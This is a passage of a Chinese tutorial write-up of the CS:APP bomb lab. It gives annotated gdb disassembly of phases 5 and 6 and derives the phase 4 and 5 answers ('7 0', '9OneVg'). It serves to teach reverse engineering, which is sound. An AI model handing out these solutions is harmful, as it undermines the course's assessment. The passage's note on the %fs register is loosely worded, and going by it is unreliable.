</span></code></pre></div></td></tr></table></div> <p>因此，<code>phase_4</code> 函数要求用户输入两个整数：<code>7 0</code></p> </li> <li> <h3 id=phase-5>Phase 5<a class=headerlink href=#phase-5 title="Permanent link">¶</a></h3> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-30-1> 1</a></span>
<span class=normal><a href=#__codelineno-30-2> 2</a></span>
<span class=normal><a href=#__codelineno-30-3> 3</a></span>
<span class=normal><a href=#__codelineno-30-4> 4</a></span>
<span class=normal><a href=#__codelineno-30-5> 5</a></span>
<span class=normal><a href=#__codelineno-30-6> 6</a></span>
<span class=normal><a href=#__codelineno-30-7> 7</a></span>
<span class=normal><a href=#__codelineno-30-8> 8</a></span>
<span class=normal><a href=#__codelineno-30-9> 9</a></span>
<span class=normal><a href=#__codelineno-30-10>10</a></span>
<span class=normal><a href=#__codelineno-30-11>11</a></span>
<span class=normal><a href=#__codelineno-30-12>12</a></span>
<span class=normal><a href=#__codelineno-30-13>13</a></span>
<span class=normal><a href=#__codelineno-30-14>14</a></span>
<span class=normal><a href=#__codelineno-30-15>15</a></span>
<span class=normal><a href=#__codelineno-30-16>16</a></span>
<span class=normal><a href=#__codelineno-30-17>17</a></span>
<span class=normal><a href=#__codelineno-30-18>18</a></span>
<span class=normal><a href=#__codelineno-30-19>19</a></span>
<span class=normal><a href=#__codelineno-30-20>20</a></span>
<span class=normal><a href=#__codelineno-30-21>21</a></span>
<span class=normal><a href=#__codelineno-30-22>22</a></span>
<span class=normal><a href=#__codelineno-30-23>23</a></span>
<span class=normal><a href=#__codelineno-30-24>24</a></span>
<span class=normal><a href=#__codelineno-30-25>25</a></span>
<span class=normal><a href=#__codelineno-30-26>26</a></span>
<span class=normal><a href=#__codelineno-30-27>27</a></span>
<span class=normal><a href=#__codelineno-30-28>28</a></span>
<span class=normal><a href=#__codelineno-30-29>29</a></span>
<span class=normal><a href=#__codelineno-30-30>30</a></span>
<span class=normal><a href=#__codelineno-30-31>31</a></span>
<span class=normal><a href=#__codelineno-30-32>32</a></span>
<span class=normal><a href=#__codelineno-30-33>33</a></span>
<span class=normal><a href=#__codelineno-30-34>34</a></span>
<span class=normal><a href=#__codelineno-30-35>35</a></span>
<span class=normal><a href=#__codelineno-30-36>36</a></span>
<span class=normal><a href=#__codelineno-30-37>37</a></span>
<span class=normal><a href=#__codelineno-30-38>38</a></span>
<span class=normal><a href=#__codelineno-30-39>39</a></span>
<span class=normal><a href=#__codelineno-30-40>40</a></span>
<span class=normal><a href=#__codelineno-30-41>41</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-30-1><a id=__codelineno-30-1 name=__codelineno-30-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-30-2><a id=__codelineno-30-2 name=__codelineno-30-2></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_5:
</span><span id=__span-30-3><a id=__codelineno-30-3 name=__codelineno-30-3></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000401062<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>push<span class=w>   </span>%rbx<span class=w>       </span><span class=c1># 保存调用者的 rbx 寄存器</span>
</span><span id=__span-30-4><a id=__codelineno-30-4 name=__codelineno-30-4></a>0x0000000000401063<span class=w> </span>&lt;+1&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x20,%rsp<span class=w>    </span><span class=c1># 分配 32 字节的栈空间</span>
</span><span id=__span-30-5><a id=__codelineno-30-5 name=__codelineno-30-5></a>0x0000000000401067<span class=w> </span>&lt;+5&gt;:<span class=w>     </span>mov<span class=w>    </span>%rdi,%rbx<span class=w>     </span><span class=c1># 保存输入的字符串指针到 rbx</span>
</span><span id=__span-30-6><a id=__codelineno-30-6 name=__codelineno-30-6></a>0x000000000040106a<span class=w> </span>&lt;+8&gt;:<span class=w>     </span>mov<span class=w>    </span>%fs:0x28,%rax<span class=w>   </span><span class=c1># 栈保护机制, 从 %fs 段寄存器偏移 0x28 的内存位置读取一个值到 %rax 寄存器</span>
</span><span id=__span-30-7><a id=__codelineno-30-7 name=__codelineno-30-7></a>0x0000000000401073<span class=w> </span>&lt;+17&gt;:<span class=w>    </span>mov<span class=w>    </span>%rax,0x18<span class=o>(</span>%rsp<span class=o>)</span><span class=w> </span><span class=c1># 存储栈金丝雀值</span>
</span><span id=__span-30-8><a id=__codelineno-30-8 name=__codelineno-30-8></a>0x0000000000401078<span class=w> </span>&lt;+22&gt;:<span class=w>    </span>xor<span class=w>    </span>%eax,%eax<span class=w>     </span><span class=c1># 清零 eax</span>
</span><span id=__span-30-9><a id=__codelineno-30-9 name=__codelineno-30-9></a>0x000000000040107a<span class=w> </span>&lt;+24&gt;:<span class=w>    </span>call<span class=w>   </span>0x40131b<span class=w> </span>&lt;string_length&gt;<span class=w> </span><span class=c1># 调用函数计算字符串长度</span>
</span><span id=__span-30-10><a id=__codelineno-30-10 name=__codelineno-30-10></a>0x000000000040107f<span class=w> </span>&lt;+29&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x6,%eax<span class=w>                </span><span class=c1># 比较长度是否为6</span>
</span><span id=__span-30-11><a id=__codelineno-30-11 name=__codelineno-30-11></a>0x0000000000401082<span class=w> </span>&lt;+32&gt;:<span class=w>    </span>je<span class=w>     </span>0x4010d2<span class=w> </span>&lt;phase_5+112&gt;<span class=w>   </span><span class=c1># 长度为6则跳转到处理部分</span>
</span><span id=__span-30-12><a id=__codelineno-30-12 name=__codelineno-30-12></a>0x0000000000401084<span class=w> </span>&lt;+34&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w>  </span><span class=c1># 长度不符，引爆炸弹</span>
</span><span id=__span-30-13><a id=__codelineno-30-13 name=__codelineno-30-13></a>0x0000000000401089<span class=w> </span>&lt;+39&gt;:<span class=w>    </span>jmp<span class=w>    </span>0x4010d2<span class=w> </span>&lt;phase_5+112&gt;
</span><span id=__span-30-14><a id=__codelineno-30-14 name=__codelineno-30-14></a>0x000000000040108b<span class=w> </span>&lt;+41&gt;:<span class=w>    </span>movzbl<span class=w> </span><span class=o>(</span>%rbx,%rax,1<span class=o>)</span>,%ecx<span class=w>  </span><span class=c1># 读取第 eax 个字符到 ecx (将一个8位的字节数据，通过零扩展的方式扩展为32位数据，然后传送到目标寄存器)</span>
</span><span id=__span-30-15><a id=__codelineno-30-15 name=__codelineno-30-15></a>0x000000000040108f<span class=w> </span>&lt;+45&gt;:<span class=w>    </span>mov<span class=w>    </span>%cl,<span class=o>(</span>%rsp<span class=o>)</span><span class=w>          </span><span class=c1># 将字符存入栈中</span>
</span><span id=__span-30-16><a id=__codelineno-30-16 name=__codelineno-30-16></a>0x0000000000401092<span class=w> </span>&lt;+48&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=o>(</span>%rsp<span class=o>)</span>,%rdx<span class=w>         </span><span class=c1># 读取该字符到 rdx</span>
</span><span id=__span-30-17><a id=__codelineno-30-17 name=__codelineno-30-17></a>0x0000000000401096<span class=w> </span>&lt;+52&gt;:<span class=w>    </span>and<span class=w>    </span><span class=nv>$0</span>xf,%edx<span class=w>           </span><span class=c1># 保留字符的低4位 (mask with 0xF)</span>
</span><span id=__span-30-18><a id=__codelineno-30-18 name=__codelineno-30-18></a>0x0000000000401099<span class=w> </span>&lt;+55&gt;:<span class=w>    </span>movzbl<span class=w> </span>0x4024b0<span class=o>(</span>%rdx<span class=o>)</span>,%edx<span class=w> </span><span class=c1># 查表转换：使用低4位作为索引查找转换表</span>
</span><span id=__span-30-19><a id=__codelineno-30-19 name=__codelineno-30-19></a>0x00000000004010a0<span class=w> </span>&lt;+62&gt;:<span class=w>    </span>mov<span class=w>    </span>%dl,0x10<span class=o>(</span>%rsp,%rax,1<span class=o>)</span><span class=w> </span><span class=c1># 存储转换后的字符到栈上的缓冲区, %rsp + (%rax × 1) + 0x10 </span>
</span><span id=__span-30-20><a id=__codelineno-30-20 name=__codelineno-30-20></a>0x00000000004010a4<span class=w> </span>&lt;+66&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x1,%rax<span class=w>           </span><span class=c1># 计数器 +1</span>
</span><span id=__span-30-21><a id=__codelineno-30-21 name=__codelineno-30-21></a>0x00000000004010a8<span class=w> </span>&lt;+70&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x6,%rax<span class=w>           </span><span class=c1># 检查是否处理完6个字符</span>
</span><span id=__span-30-22><a id=__codelineno-30-22 name=__codelineno-30-22></a>0x00000000004010ac<span class=w> </span>&lt;+74&gt;:<span class=w>    </span>jne<span class=w>    </span>0x40108b<span class=w> </span>&lt;phase_5+41&gt;<span class=w> </span><span class=c1># 未处理完则继续循环</span>
</span><span id=__span-30-23><a id=__codelineno-30-23 name=__codelineno-30-23></a>0x00000000004010ae<span class=w> </span>&lt;+76&gt;:<span class=w>    </span>movb<span class=w>   </span><span class=nv>$0</span>x0,0x16<span class=o>(</span>%rsp<span class=o>)</span><span class=w>     </span><span class=c1># 在转换后的字符串末尾添加 null 终止符</span>
</span><span id=__span-30-24><a id=__codelineno-30-24 name=__codelineno-30-24></a>0x00000000004010b3<span class=w> </span>&lt;+81&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x40245e,%esi<span class=w>      </span><span class=c1># 设置src字符串指针（预设的目标字符串）</span>
</span><span id=__span-30-25><a id=__codelineno-30-25 name=__codelineno-30-25></a>0x00000000004010b8<span class=w> </span>&lt;+86&gt;:<span class=w>    </span>lea<span class=w>    </span>0x10<span class=o>(</span>%rsp<span class=o>)</span>,%rdi<span class=w>     </span><span class=c1># 设置dst字符串指针（转换后的字符串）</span>
</span><span id=__span-30-26><a id=__codelineno-30-26 name=__codelineno-30-26></a>0x00000000004010bd<span class=w> </span>&lt;+91&gt;:<span class=w>    </span>call<span class=w>   </span>0x401338<span class=w> </span>&lt;strings_not_equal&gt;<span class=w> </span><span class=c1># 比较两个字符串</span>
</span><span id=__span-30-27><a id=__codelineno-30-27 name=__codelineno-30-27></a>0x00000000004010c2<span class=w> </span>&lt;+96&gt;:<span class=w>    </span><span class=nb>test</span><span class=w>   </span>%eax,%eax<span class=w>               </span><span class=c1># 检查比较结果是否为0（相等）</span>
</span><span id=__span-30-28><a id=__codelineno-30-28 name=__codelineno-30-28></a>0x00000000004010c4<span class=w> </span>&lt;+98&gt;:<span class=w>    </span>je<span class=w>     </span>0x4010d9<span class=w> </span>&lt;phase_5+119&gt;<span class=w>  </span><span class=c1># 字符串相等则通过验证</span>
</span><span id=__span-30-29><a id=__codelineno-30-29 name=__codelineno-30-29></a>0x00000000004010c6<span class=w> </span>&lt;+100&gt;:<span class=w>   </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 字符串不相等，引爆炸弹</span>
</span><span id=__span-30-30><a id=__codelineno-30-30 name=__codelineno-30-30></a>0x00000000004010cb<span class=w> </span>&lt;+105&gt;:<span class=w>   </span>nopl<span class=w>   </span>0x0<span class=o>(</span>%rax,%rax,1<span class=o>)</span>
</span><span id=__span-30-31><a id=__codelineno-30-31 name=__codelineno-30-31></a>0x00000000004010d0<span class=w> </span>&lt;+110&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x4010d9<span class=w> </span>&lt;phase_5+119&gt;
</span><span id=__span-30-32><a id=__codelineno-30-32 name=__codelineno-30-32></a>0x00000000004010d2<span class=w> </span>&lt;+112&gt;:<span class=w>   </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax<span class=w> </span><span class=c1># == 核心: 字符串转换循环 ==, 初始化计数器 eax = 0</span>
</span><span id=__span-30-33><a id=__codelineno-30-33 name=__codelineno-30-33></a>0x00000000004010d7<span class=w> </span>&lt;+117&gt;:<span class=w>   </span>jmp<span class=w>    </span>0x40108b<span class=w> </span>&lt;phase_5+41&gt;<span class=w>  </span><span class=c1># 跳转到循环开始</span>
</span><span id=__span-30-34><a id=__codelineno-30-34 name=__codelineno-30-34></a>0x00000000004010d9<span class=w> </span>&lt;+119&gt;:<span class=w>   </span>mov<span class=w>    </span>0x18<span class=o>(</span>%rsp<span class=o>)</span>,%rax<span class=w>        </span><span class=c1># 恢复栈金丝雀值</span>
</span><span id=__span-30-35><a id=__codelineno-30-35 name=__codelineno-30-35></a>0x00000000004010de<span class=w> </span>&lt;+124&gt;:<span class=w>   </span>xor<span class=w>    </span>%fs:0x28,%rax<span class=w>          </span><span class=c1># 检查栈是否被破坏</span>
</span><span id=__span-30-36><a id=__codelineno-30-36 name=__codelineno-30-36></a>0x00000000004010e7<span class=w> </span>&lt;+133&gt;:<span class=w>   </span>je<span class=w>     </span>0x4010ee<span class=w> </span>&lt;phase_5+140&gt;<span class=w> </span><span class=c1># 栈未被破坏则继续</span>
</span><span id=__span-30-37><a id=__codelineno-30-37 name=__codelineno-30-37></a>0x00000000004010e9<span class=w> </span>&lt;+135&gt;:<span class=w>   </span>call<span class=w>   </span>0x400b30<span class=w> </span>&lt;__stack_chk_fail@plt&gt;<span class=w> </span><span class=c1># 栈被破坏，报错</span>
</span><span id=__span-30-38><a id=__codelineno-30-38 name=__codelineno-30-38></a>0x00000000004010ee<span class=w> </span>&lt;+140&gt;:<span class=w>   </span>add<span class=w>    </span><span class=nv>$0</span>x20,%rsp<span class=w> </span><span class=c1># 释放栈空间</span>
</span><span id=__span-30-39><a id=__codelineno-30-39 name=__codelineno-30-39></a>0x00000000004010f2<span class=w> </span>&lt;+144&gt;:<span class=w>   </span>pop<span class=w>    </span>%rbx<span class=w>       </span><span class=c1># 恢复 rbx 寄存器</span>
</span><span id=__span-30-40><a id=__codelineno-30-40 name=__codelineno-30-40></a>0x00000000004010f3<span class=w> </span>&lt;+145&gt;:<span class=w>   </span>ret<span class=w>               </span><span class=c1># 返回</span>
</span><span id=__span-30-41><a id=__codelineno-30-41 name=__codelineno-30-41></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span></code></pre></div></td></tr></table></div> <p>因此，<code>phase_5</code> 函数实现了一个基于查表的字符串转换与验证系统，具体功能如下：</p> <ul> <li>输入验证：要求用户输入一个长度为6的字符串</li> <li> <p>字符转换处理：对输入字符串的每个字符进行以下处理：</p> <ul> <li>提取字符ASCII码的低4位（通过 and $0xf 操作）</li> <li>使用这4位作为索引，从转换表中查找对应的字符</li> <li>将转换后的字符存入栈上的缓冲区</li> </ul> </li> <li> <p>字符串比较验证：在转换完成后，添加字符串结束符 '\0'，然后与预设的目标字符串 "flyers" 进行比较</p> <ul> <li>如果两个字符串完全匹配，则通过验证</li> <li>否则，引爆炸弹</li> </ul> </li> <li> <p>栈保护机制：使用栈金丝雀（Stack Canary）技术防止栈溢出攻击</p> </li> </ul> <p>查看预设的目标字符串和转换表的内容：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-31-1>1</a></span>
<span class=normal><a href=#__codelineno-31-2>2</a></span>
<span class=normal><a href=#__codelineno-31-3>3</a></span>
<span class=normal><a href=#__codelineno-31-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-31-1><a id=__codelineno-31-1 name=__codelineno-31-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/s<span class=w> </span>0x40245e
</span><span id=__span-31-2><a id=__codelineno-31-2 name=__codelineno-31-2></a>0x40245e:<span class=w>       </span><span class=s2>"flyers"</span>
</span><span id=__span-31-3><a id=__codelineno-31-3 name=__codelineno-31-3></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/s<span class=w> </span>0x4024b0<span class=w> </span>
</span><span id=__span-31-4><a id=__codelineno-31-4 name=__codelineno-31-4></a>0x4024b0<span class=w> </span>&lt;array.3449&gt;:<span class=w>  </span><span class=s2>"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span>
</span></code></pre></div></td></tr></table></div> <p>转换表索引分析：转换表的前16个字符（索引0-15）如下：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-32-1>1</a></span>
<span class=normal><a href=#__codelineno-32-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-32-1><a id=__codelineno-32-1 name=__codelineno-32-1></a>索引: 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
</span><span id=__span-32-2><a id=__codelineno-32-2 name=__codelineno-32-2></a>字符: m a d u i e r s n f  o  t  v  b  y  l
</span></code></pre></div></td></tr></table></div> <p>逆向推导输入字符：</p> <ul> <li> <p>目标字符串 "flyers" 中每个字符在转换表中的索引：</p> <ul> <li>'f' → 索引9</li> <li>'l' → 索引15</li> <li>'y' → 索引14</li> <li>'e' → 索引5</li> <li>'r' → 索引6</li> <li>'s' → 索引7</li> </ul> </li> <li> <p>我们需要6个字符，其ASCII码的低4位分别等于上述索引值</p> </li> <li>选择可打印字符，得到输入字符串为：<code>9OneVg</code><ul> <li>'9' (ASCII 0x39)：低4位为9</li> <li>'O' (ASCII 0x4f)：低4位为15</li> <li>'n' (ASCII 0x6e)：低4位为14</li> <li>'e' (ASCII 0x65)：低4位为5</li> <li>'V' (ASCII 0x56)：低4位为6</li> <li>'g' (ASCII 0x67)：低4位为7</li> </ul> </li> </ul> <p>因此，输入字符串 <code>9OneVg</code> 符合验证要求，能够通过 <code>phase_5</code> 函数的验证。</p> <div class="admonition note"> <p class=admonition-title>%fs 段寄存器</p> <p>fs 段寄存器是一个特殊的寄存器，它的值是由操作系统决定的，而不是由程序决定的，所以它的值是不会被修改的，这样就可以防止被恶意修改。</p> </div> </li> <li> <h3 id=phase-6>Phase 6<a class=headerlink href=#phase-6 title="Permanent link">¶</a></h3> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-33-1> 1</a></span>
<span class=normal><a href=#__codelineno-33-2> 2</a></span>
<span class=normal><a href=#__codelineno-33-3> 3</a></span>
<span class=normal><a href=#__codelineno-33-4> 4</a></span>
<span class=normal><a href=#__codelineno-33-5> 5</a></span>
<span class=normal><a href=#__codelineno-33-6> 6</a></span>
<span class=normal><a href=#__codelineno-33-7> 7</a></span>
<span class=normal><a href=#__codelineno-33-8> 8</a></span>
<span class=normal><a href=#__codelineno-33-9> 9</a></span>
<span class=normal><a href=#__codelineno-33-10>10</a></span>
<span class=normal><a href=#__codelineno-33-11>11</a></span>
<span class=normal><a href=#__codelineno-33-12>12</a></span>
<span class=normal><a href=#__codelineno-33-13>13</a></span>
<span class=normal><a href=#__codelineno-33-14>14</a></span>
<span class=normal><a href=#__codelineno-33-15>15</a></span>
<span class=normal><a href=#__codelineno-33-16>16</a></span>
<span class=normal><a href=#__codelineno-33-17>17</a></span>
<span class=normal><a href=#__codelineno-33-18>18</a></span>
<span class=normal><a href=#__codelineno-33-19>19</a></span>
<span class=normal><a href=#__codelineno-33-20>20</a></span>
<span class=normal><a href=#__codelineno-33-21>21</a></span>
<span class=normal><a href=#__codelineno-33-22>22</a></span>
<span class=normal><a href=#__codelineno-33-23>23</a></span>
<span class=normal><a href=#__codelineno-33-24>24</a></span>
<span class=normal><a href=#__codelineno-33-25>25</a></span>
<span class=normal><a href=#__codelineno-33-26>26</a></span>
<span class=normal><a href=#__codelineno-33-27>27</a></span>
<span class=normal><a href=#__codelineno-33-28>28</a></span>
<span class=normal><a href=#__codelineno-33-29>29</a></span>
<span class=normal><a href=#__codelineno-33-30>30</a></span>
<span class=normal><a href=#__codelineno-33-31>31</a></span>
<span class=normal><a href=#__codelineno-33-32>32</a></span>
<span class=normal><a href=#__codelineno-33-33>33</a></span>
<span class=normal><a href=#__codelineno-33-34>34</a></span>
<span class=normal><a href=#__codelineno-33-35>35</a></span>
<span class=normal><a href=#__codelineno-33-36>36</a></span>
<span class=normal><a href=#__codelineno-33-37>37</a></span>
<span class=normal><a href=#__codelineno-33-38>38</a></span>
<span class=normal><a href=#__codelineno-33-39>39</a></span>
<span class=normal><a href=#__codelineno-33-40>40</a></span>
<span class=normal><a href=#__codelineno-33-41>41</a></span>
<span class=normal><a href=#__codelineno-33-42>42</a></span>
<span class=normal><a href=#__codelineno-33-43>43</a></span>
<span class=normal><a href=#__codelineno-33-44>44</a></span>
<span class=normal><a href=#__codelineno-33-45>45</a></span>
<span class=normal><a href=#__codelineno-33-46>46</a></span>
<span class=normal><a href=#__codelineno-33-47>47</a></span>
<span class=normal><a href=#__codelineno-33-48>48</a></span>
<span class=normal><a href=#__codelineno-33-49>49</a></span>
<span class=normal><a href=#__codelineno-33-50>50</a></span>
<span class=normal><a href=#__codelineno-33-51>51</a></span>
<span class=normal><a href=#__codelineno-33-52>52</a></span>
<span class=normal><a href=#__codelineno-33-53>53</a></span>
<span class=normal><a href=#__codelineno-33-54>54</a></span>
<span class=normal><a href=#__codelineno-33-55>55</a></span>
<span class=normal><a href=#__codelineno-33-56>56</a></span>
<span class=normal><a href=#__codelineno-33-57>57</a></span>
<span class=normal><a href=#__codelineno-33-58>58</a></span>
<span class=normal><a href=#__codelineno-33-59>59</a></span>
<span class=normal><a href=#__codelineno-33-60>60</a></span>
<span class=normal><a href=#__codelineno-33-61>61</a></span>
<span class=normal><a href=#__codelineno-33-62>62</a></span>
<span class=normal><a href=#__codelineno-33-63>63</a></span>
<span class=normal><a href=#__codelineno-33-64>64</a></span>
<span class=normal><a href=#__codelineno-33-65>65</a></span>
<span class=normal><a href=#__codelineno-33-66>66</a></span>
<span class=normal><a href=#__codelineno-33-67>67</a></span>
<span class=normal><a href=#__codelineno-33-68>68</a></span>
<span class=normal><a href=#__codelineno-33-69>69</a></span>
<span class=normal><a href=#__codelineno-33-70>70</a></span>
<span class=normal><a href=#__codelineno-33-71>71</a></span>
<span class=normal><a href=#__codelineno-33-72>72</a></span>
<span class=normal><a href=#__codelineno-33-73>73</a></span>
<span class=normal><a href=#__codelineno-33-74>74</a></span>
<span class=normal><a href=#__codelineno-33-75>75</a></span>
<span class=normal><a href=#__codelineno-33-76>76</a></span>
<span class=normal><a href=#__codelineno-33-77>77</a></span>
<span class=normal><a href=#__codelineno-33-78>78</a></span>
<span class=normal><a href=#__codelineno-33-79>79</a></span>
<span class=normal><a href=#__codelineno-33-80>80</a></span>
<span class=normal><a href=#__codelineno-33-81>81</a></span>
<span class=normal><a href=#__codelineno-33-82>82</a></span>
<span class=normal><a href=#__codelineno-33-83>83</a></span>
<span class=normal><a href=#__codelineno-33-84>84</a></span>
<span class=normal><a href=#__codelineno-33-85>85</a></span>
<span class=normal><a href=#__codelineno-33-86>86</a></span>
<span class=normal><a href=#__codelineno-33-87>87</a></span>
<span class=normal><a href=#__codelineno-33-88>88</a></span>
<span class=normal><a href=#__codelineno-33-89>89</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-33-1><a id=__codelineno-33-1 name=__codelineno-33-1></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-33-2><a id=__codelineno-33-2 name=__codelineno-33-2></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_6:
</span><span id=__span-33-3><a id=__codelineno-33-3 name=__codelineno-33-3></a><span class=o>=</span>&gt;<span class=w> </span>0x00000000004010f4<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>push<span class=w>   </span>%r14<span class=w> </span><span class=c1># 保存5个寄存器的值，为函数执行准备栈帧</span>
</span><span id=__span-33-4><a id=__codelineno-33-4 name=__codelineno-33-4></a>0x00000000004010f6<span class=w> </span>&lt;+2&gt;:<span class=w>     </span>push<span class=w>   </span>%r13
</span><span id=__span-33-5><a id=__codelineno-33-5 name=__codelineno-33-5></a>0x00000000004010f8<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>push<span class=w>   </span>%r12
</span><span id=__span-33-6><a id=__codelineno-33-6 name=__codelineno-33-6></a>0x00000000004010fa<span class=w> </span>&lt;+6&gt;:<span class=w>     </span>push<span class=w>   </span>%rbp
</span><span id=__span-33-7><a id=__codelineno-33-7 name=__codelineno-33-7></a>0x00000000004010fb<span class=w> </span>&lt;+7&gt;:<span class=w>     </span>push<span class=w>   </span>%rbx
</span><span id=__span-33-8><a id=__codelineno-33-8 name=__codelineno-33-8></a>0x00000000004010fc<span class=w> </span>&lt;+8&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x50,%rsp<span class=w>  </span><span class=c1># 分配80字节的栈空间</span>
</span><span id=__span-33-9><a id=__codelineno-33-9 name=__codelineno-33-9></a>0x0000000000401100<span class=w> </span>&lt;+12&gt;:<span class=w>    </span>mov<span class=w>    </span>%rsp,%r13
</span><span id=__span-33-10><a id=__codelineno-33-10 name=__codelineno-33-10></a>0x0000000000401103<span class=w> </span>&lt;+15&gt;:<span class=w>    </span>mov<span class=w>    </span>%rsp,%rsi<span class=w>   </span><span class=c1># 设置rsi为read_six_numbers函数的参数（输入缓冲区地址）</span>
</span><span id=__span-33-11><a id=__codelineno-33-11 name=__codelineno-33-11></a>0x0000000000401106<span class=w> </span>&lt;+18&gt;:<span class=w>    </span>call<span class=w>   </span>0x40145c<span class=w> </span>&lt;read_six_numbers&gt;
</span><span id=__span-33-12><a id=__codelineno-33-12 name=__codelineno-33-12></a>0x000000000040110b<span class=w> </span>&lt;+23&gt;:<span class=w>    </span>mov<span class=w>    </span>%rsp,%r14
</span><span id=__span-33-13><a id=__codelineno-33-13 name=__codelineno-33-13></a>0x000000000040110e<span class=w> </span>&lt;+26&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%r12d<span class=w>  </span><span class=c1># 初始化计数器r12d为0</span>
</span><span id=__span-33-14><a id=__codelineno-33-14 name=__codelineno-33-14></a>0x0000000000401114<span class=w> </span>&lt;+32&gt;:<span class=w>    </span>mov<span class=w>    </span>%r13,%rbp<span class=w>   </span><span class=c1># 将当前检查的元素地址保存到rbp</span>
</span><span id=__span-33-15><a id=__codelineno-33-15 name=__codelineno-33-15></a>0x0000000000401117<span class=w> </span>&lt;+35&gt;:<span class=w>    </span>mov<span class=w>    </span>0x0<span class=o>(</span>%r13<span class=o>)</span>,%eax<span class=w> </span><span class=c1># 取出当前要检查的元素值到eax</span>
</span><span id=__span-33-16><a id=__codelineno-33-16 name=__codelineno-33-16></a>0x000000000040111b<span class=w> </span>&lt;+39&gt;:<span class=w>    </span>sub<span class=w>    </span><span class=nv>$0</span>x1,%eax<span class=w>   </span><span class=c1># 将元素值减1（用于范围检查）</span>
</span><span id=__span-33-17><a id=__codelineno-33-17 name=__codelineno-33-17></a>0x000000000040111e<span class=w> </span>&lt;+42&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x5,%eax<span class=w>   </span><span class=c1># == 范围检查 ==, 比较减1后的值是否&lt;=5</span>
</span><span id=__span-33-18><a id=__codelineno-33-18 name=__codelineno-33-18></a>0x0000000000401121<span class=w> </span>&lt;+45&gt;:<span class=w>    </span>jbe<span class=w>    </span>0x401128<span class=w> </span>&lt;phase_6+52&gt;<span class=w>   </span><span class=c1># 如果值在1-6范围内，跳转到+52</span>
</span><span id=__span-33-19><a id=__codelineno-33-19 name=__codelineno-33-19></a>0x0000000000401123<span class=w> </span>&lt;+47&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;<span class=w> </span><span class=c1># 否则引爆炸弹</span>
</span><span id=__span-33-20><a id=__codelineno-33-20 name=__codelineno-33-20></a>0x0000000000401128<span class=w> </span>&lt;+52&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x1,%r12d<span class=w>  </span><span class=c1># == 唯一性检查 ==, 计数器r12d加1</span>
</span><span id=__span-33-21><a id=__codelineno-33-21 name=__codelineno-33-21></a>0x000000000040112c<span class=w> </span>&lt;+56&gt;:<span class=w>    </span>cmp<span class=w>    </span><span class=nv>$0</span>x6,%r12d<span class=w>  </span><span class=c1># 检查是否已经处理了6个元素</span>
</span><span id=__span-33-22><a id=__codelineno-33-22 name=__codelineno-33-22></a>0x0000000000401130<span class=w> </span>&lt;+60&gt;:<span class=w>    </span>je<span class=w>     </span>0x401153<span class=w> </span>&lt;phase_6+95&gt;<span class=w> </span><span class=c1># 如果是，跳转到数值转换阶段</span>
</span><span id=__span-33-23><a id=__codelineno-33-23 name=__codelineno-33-23></a>0x0000000000401132<span class=w> </span>&lt;+62&gt;:<span class=w>    </span>mov<span class=w>    </span>%r12d,%ebx<span class=w> </span><span class=c1># 设置ebx为当前元素的索引</span>
</span><span id=__span-33-24><a id=__codelineno-33-24 name=__codelineno-33-24></a>0x0000000000401135<span class=w> </span>&lt;+65&gt;:<span class=w>    </span>movslq<span class=w> </span>%ebx,%rax<span class=w>  </span><span class=c1># 将32位ebx符号扩展为64位rax</span>
</span><span id=__span-33-25><a id=__codelineno-33-25 name=__codelineno-33-25></a>0x0000000000401138<span class=w> </span>&lt;+68&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=o>(</span>%rsp,%rax,4<span class=o>)</span>,%eax<span class=w> </span><span class=c1># 根据索引取出后续元素的值</span>
